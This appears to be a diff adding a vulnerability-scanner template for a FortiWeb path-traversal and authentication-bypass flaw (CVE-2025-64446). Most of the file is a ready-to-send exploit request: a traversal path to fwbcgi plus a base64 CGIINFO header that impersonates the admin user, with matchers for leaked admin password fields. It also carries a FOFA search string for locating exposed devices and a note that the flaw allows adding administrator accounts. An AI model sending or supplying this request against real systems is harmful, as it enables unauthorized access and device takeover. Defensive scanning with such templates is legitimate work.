@@ -1,0 +1,31 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          regex:
+            - '"access-profile":'
+            - '"password":'
+            - '"force-password-change":'
+          type: regex
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          GET /api/v2.0/cmdb/system/admin%3f/../../../../../cgi-bin/fwbcgi HTTP/1.1
+          Host: {{Hostname}}
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
+          CGIINFO: eyJ1c2VybmFtZSI6ICJhZG1pbiIsICJwcm9mbmFtZSI6ICJwcm9mX2FkbWluIiwgInZkb20iOiAicm9vdCIsICJsb2dpbm5hbWUiOiAiYWRtaW4ifQ==
+id: FortiWeb-Directory-traversal-CVE-2025-64446
+info:
+    author: Superhero
+    description: |-
+        fofa: app="FORTINET-FortiWeb" || app="FortiWeb"
+        其在特定版本存在敏感信息泄露和身份认证绕过漏洞，由于其fwbcgi组件完全信任请求中HTTP_CGIINFO的用户信息，而未能进行有效的身份验证，攻击者通过构造特定的请求，可以任意地添加管理员账户，从而获得设备的完全控制权。
+    name: FortiWeb 相对路径遍历漏洞(CVE-2025-64446)
+    reference:
+        - https://mp.weixin.qq.com/s/cKVmVKvqFLd5xgEw011VVA
+    severity: high
+    tags:
+        - Directory traversal
